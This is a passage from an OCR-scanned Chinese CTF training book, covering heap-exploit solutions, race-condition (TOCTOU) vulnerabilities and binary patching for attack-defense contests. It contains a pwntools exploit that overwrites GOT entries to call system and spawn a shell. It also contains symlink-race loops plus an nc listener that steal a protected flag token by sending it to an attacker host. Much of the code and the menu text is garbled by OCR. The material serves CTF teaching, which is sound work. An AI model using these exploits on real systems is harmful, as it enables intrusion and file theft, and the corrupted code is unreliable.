#useful_code---end
#editnode1:overwritenode1->overflownode2
edit_note(io,-9223372036854775808,data1)
#edit note（io,1,score,data1)
#delete node 2,unlink node 1->unlink
#delete_a_restaurant(io,2)
delete_note(io,target_id+1)
alarm_got=0x0000000000602038
puts_plt=0x0000000000400730
free_got=0x0000000000602018
data1=I64（0x0)+164（alarm got)+164（free got)+164（free got）
edit_note(io,target_id,data1)
data1=164（puts_plt)[:6]
io.gdb_hint()
edit_note(io,target_id,data1)
#io.read_until("option--->>\n")
#io.writeline("3")
#io.read_until(id of the note:\n")
#io.writeline(164(atol_got)
#data=io.readuntil("n")
#print[cforcin data]
delete_note(io,0)
data = io.read_until(n")[:-1]
print [c for c in data]
alarm_addr= 164(data.ljust(8,x00"))
print"alarm_addr:",hex(alarm_addr)
elf_info =ELF("./libc-2.19.so")
#elf _info=ELF("./libc.so.6")
alarm_offset = elf_info.symbols["alarm"]
system_offset =elf_info.symbols[system"]
libcbase=alarmaddr-alarm_offset
system_addr=libc_base+system_offset
data=164（system_addr)[:6]
edit _note（io,1,data)
delete_note(io,6)
io.interact()
io=get_io(target)
pwn(io)
---
## Page 592
CTF特训营：技术详解、解题方法与
15.4真题解析
592/1144
---
## Page 593
CTF特训营：技术详解、解题方法与
16.1基本概念
593/1144
第16章逻辑漏洞
16.1基本概念
逻辑漏洞主要是指程序逻辑上出现的问题，例如逻辑不严密或者
逻辑太复杂，从而导致一些逻辑分支不能正常处理或处理错误，通常
这类漏洞多出现在Web里面或者Crypto里面，如越权访问、密码爆破
等。CTF的PWN题目中涉及逻辑漏洞的概率较小，一方面构造新的
逻辑漏洞难度较大，另外这个漏洞很少作为PWN题的主干部分。本
章将主要介绍逻辑漏洞中“有套路”的竞态条件漏洞。
---
## Page 594
CTF特训营：技术详解、解题方法与
16.2竞态条件漏洞
594/1144
16.2竞态条件漏洞
竞态条件（RaceCondition）漏洞是指多任务（多进程、多线程
等）对同一资源进行访问时，因访问资源的先后顺序不同产生冲突的
情况。通过竞态条件漏洞，可以实现越权访问、资源篡改等操作。
下面用一个简单的例子来说明竞态条件漏洞，代码如下：
#include
#include 
int resource=0;
void *main_logic()
{
if （resource ==0）
printf("logic On");
}
sleep(2);
if (resource ==1)
printf(logic 1\n");
void*set_resource()
sleep(1);
resource=1;
#defineTHREAD_COUNT2
int main()
pthread_t thread[THREAD_COUNT];
int i;
---
## Page 595
CTF特训营：技术详解、解题方法与
16.2竞态条件漏洞
595/1144
pthread_create(&thread[O],NULL,(void *)set_resource,NULL);
pthread_create(&thread[1],NULL,(void *)main_logic,NULL);
for(i=O;i
#include
#include
#include
#include
#include
#include
#include
#include
intmain(int argc,char **argv)
charfile;
char *host;
if（argc<3）{
printf(%s file hostinltsends file to host if you have access to itin", argv[O]);
exit(1);
file =argv[1];
host =argv[2];
if(access(argv[1],R_OK)==0){
int ffd;
int rc;
struct sockaddr_in sin;
char buffer[4096];
printf(Connecting to %s:18211..", host);fflush(stdout);
fd=socket（AF_INET,SOCKSTREAM,O);
memset（&sin,O,sizeof（struct sockaddr_in);
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = inet_addr(host);
sin.sin_port=htons(18211);
---
## Page 598
CTF特训营：技术详解、解题方法与
16.3真题解析
598/1144
if（connect（fd,（void*)&sin,sizeof(struct sockaddr_in))==-1）{
printf("Unable to connect tohost%sin",host)
exit(EXIT_FAILURE);
#define HITHERE".oO Oo.n"
if(write(fd,HITHERE,strlen(HITHERE))== -1){
printf(*Unable to write banner to host %sin",host);
exit(EXIT_FAILURE);
#undef HITHERE
printf("Connected!inSending file..");fflush(stdout);
ffd=open（file,O_RDONLY);
if(ffd == -1){
printf("Damn. Unable to open fileln");
exit(EXIT_FAILURE);
rc=read(ffd,buffer, sizeof(buffer);
if（rc==-1）{
printf(Unable to read from file:%sln", strerror(errno);
exit(EXIT_FAILURE);
write(fd,buffer,rc);
printf(wrote filelin");
}else{
printf(You dont have access to %sin”file);
对上述代码所示解法分析如下。
1）判断access函数的动作与open函数的打开动作之间不是原子
操作，两者存在一个时间差，如果在此时改变文件，那么就会绕过
access的检查。
2）不断地对两个文件进行软连接，其中，一个是自己的文件
---
## Page 599
CTF特训营：技术详解、解题方法与
16.3真题解析
599/1144
"/token_fake”，可读可写；一个是flag文件"./flag10/token"，只允
许特定用户读取。通过循环，不断建立连接，以产生上述绕过检查的
机会。
命令：
while true;doIn-fs token fake token use;In-fs../flag10/token token use;done
3）然后不断运行如下程序：
/flag10/flag10
while true; do../flag10/flag10 token_use target_ip; done
while true;donc-1-p18211;done
---
## Page 600
CTF特训营：技术详解、解题方法与
第17章Attack&Defense模式
600/1144
第17章Attack&Defense模式
对于现在出现的诸多CTF线下赛模式来说，Attack&Defense模式
又称A&D模式（攻防模式），是最原始也是最正宗的CTF攻防竞赛模
式。其由Defcon推广至国内，最早由蓝莲花战队的BCTF2014呈现。
后期出现了诸多变种，但是综合来说，Attack&Defense模式是最公平、
公正，也是最具有挑战性的CTF线下赛模式。本章将主要介绍攻防模
式下的一些策略和修补方案。
---
## Page 601
CTF特训营：技术详解、解题方法与
17.1修补方案
601/1144
17.1修补方案
在攻防模式下，漏洞修补是尤为重要的，这里会以一些常见漏洞
类型不同的Patch应对方法来进行介绍。在Patch的过程中，我们通常
会使用IDA的keypatch插件（http://www.keystone-engine.org/
keypatch/）作为修补工具，其提供了Patcher、FillRange和Search三
个功能帮助我们打补丁。
---
## Page 602
CTF特训营：技术详解、解题方法与
17.1.1大小修改法
602/1144
17.1.1大小修改法
在一些栈溢出或者堆溢出的特殊场景中，我们可以通过修改分
配、读取、复制的内存大小来防止缓冲区溢出造成的破坏。缓冲区程
序的反编译代码如图17-1所示。
1int _cdecl main(int argc， const char **argv，const char **envp)
2
int buf; // [esp+1Ch][ebp-14h]
5
puts("ROP is easy is'nt it ?");
6
printf("Your input:");
7
Fflush(stdout);
8
return read(0,&buf,100);
9}
图17-1缓冲区程序的反编译代码
如图17-1所示，此时“read（0.&buf，100）：”处存在明显的栈溢
出，我们可以通过修改read的大小来修补栈溢出漏洞。从代码中我们
可以看出，当读入的数据大于0x14时，可能会覆盖ebp，所以我们将
read大小修改为小于0x14即可。IDAPatch功能的选项如图17-2所
示。
---
## Page 603
CTF特训营：技术详解、解题方法与
17.1.1大小修改法
603/1144
Co
lump
View
Chbl+C
品X口
Help
TPr
Begin
At-L
Shi+E
口
口品
Expo
data
Code
C
todec
tt
Dets
taings
Ab+Q
Aeray-
tr
con
Srusts
t
Funtions
Patch 
Dther
al1
Pugins
Raze
p1, 0
C+D
Alt+F12
CMl+A843
fix C
Pump Clet
At+9
At+8
At+F11
Load DWARF fle
DASI
图17-2
IDAPatch功能的选项
依次选择Edit→Plugins→KeypatchPatcher，如图17-3所示，将
0x64修改为0x10。
---
## Page 604
CTF特训营：技术详解、解题方法与
17.1.1大小修改法
604/1144
KEYPATCH:Patcher
×
Symtax
Intel
Address
.text:08048E52
Original
mov dword ptr [esp+6], 64h
Encode
C744240864000000
Size
8
Assembly
mov dword ptr [esp+6],0x10h
√
Fixup
mov dword ptr [esp+8], 0x10h
√
一
Encode
C744240810000000
√
一
Size
8
√
NOPs padding until next instruction boundary
Save original instructions in IDA comment
Patch
Cancel
图17-3Patcher参数设置
点击Patch按钮，然后依次选择Edit→Patchprogram→Apple
---
## Page 605
CTF特训营：技术详解、解题方法与